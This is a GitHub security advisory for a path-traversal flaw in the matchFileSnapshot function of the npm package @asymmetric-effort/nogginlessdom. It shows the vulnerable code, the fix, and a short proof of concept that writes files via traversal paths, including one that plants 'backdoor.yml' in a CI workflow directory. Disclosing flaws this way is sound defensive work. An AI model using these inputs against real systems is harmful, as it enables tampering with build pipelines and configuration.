# [H] @asymmetric-effort/nogginlessdom's Path Traversal in matchFileSnapshot allows arbitrary file write

## Summary
Severity: High
Advisory: GHSA-322x-v876-g883
CWE: CWE-22
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-07-02
Source: https://github.com/advisories/GHSA-322x-v876-g883
Type: github-advisory

## Affected
- npm: `@asymmetric-effort/nogginlessdom` — affected >=0 <0.0.22

## Details
## Summary

The `matchFileSnapshot` function in `src/assertions/snapshots.ts` accepted a `filePath` parameter with zero validation. When snapshot update mode was active (`UPDATE_SNAPSHOTS=1` or `setUpdateMode('all')`), an attacker who controls test input could write arbitrary content to any filesystem path the process has write access to, including creating intermediate directories.

## Affected Code

**File:** `src/assertions/snapshots.ts`, lines 732-769

```typescript
export function matchFileSnapshot(actual: unknown, filePath: string): void {
  const serialized = serialize(actual);
  const mode = resolveUpdateMode();
  const fileExists = fs.existsSync(filePath);

  if (!fileExists) {
    if (mode === 'all' || mode === 'new') {
      const dir = path.dirname(filePath);
      if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
      }
      fs.writeFileSync(filePath, serialized, 'utf-8');
```

The `filePath` flows from `expect(value).toMatchFileSnapshot(filePath)` at `index.ts:1033-1035` with no sanitization, no check that the path is within an expected directory, and no symlink resolution.

## Proof of Concept

```typescript
import { expect, setUpdateMode } from '@asymmetric-effort/nogginlessdom';

setUpdateMode('all');

// Writes arbitrary content to any writable path
expect('malicious content').toMatchFileSnapshot('/tmp/exploit/payload.txt');

// Path traversal via relative components
expect('data').toMatchFileSnapshot('../../../tmp/evil.txt');

// In CI environments, could overwrite CI config
expect('injected step').toMatchFileSnapshot('/home/runner/.github/workflows/backdoor.yml');
```

## Impact

In CI/CD environments where test files may come from untrusted pull requests, this allows writing to any writable filesystem location with directory creation. An attacker could overwrite configuration files, inject code into build artifacts, or modify CI pipeline definitions.

## Fix

Fixed in commit https://github.com/asymmetric-effort/NogginLessDom/commit/785e6ac6e124d1a89b3ccf40bbd75fc8e4cb215d on `main`. The `matchFileSnapshot` function now validates that the resolved file path is within the project root directory (defaults to `process.cwd()`, configurable via optional `projectRoot` parameter). Paths that resolve outside the project directory are rejected with a descriptive error.

```typescript
export function matchFileSnapshot(
  actual: unknown,
  filePath: string,
  projectRoot?: string,
): void {
  const root = projectRoot ?? process.cwd();
  const resolved = path.resolve(root, filePath);
  if (!resolved.startsWith(root + path.sep) && resolved !== root) {
    throw new Error(
      `File snapshot path must be within the project directory: ${filePath}`,
    );
  }
  // ... all subsequent file I/O uses `resolved` instead of `filePath`
}
```

## References
- https://github.com/asymmetric-effort/NogginLessDom/security/advisories/GHSA-322x-v876-g883
- https://github.com/asymmetric-effort/NogginLessDom/commit/785e6ac6e124d1a89b3ccf40bbd75fc8e4cb215d
- https://github.com/asymmetric-effort/NogginLessDom
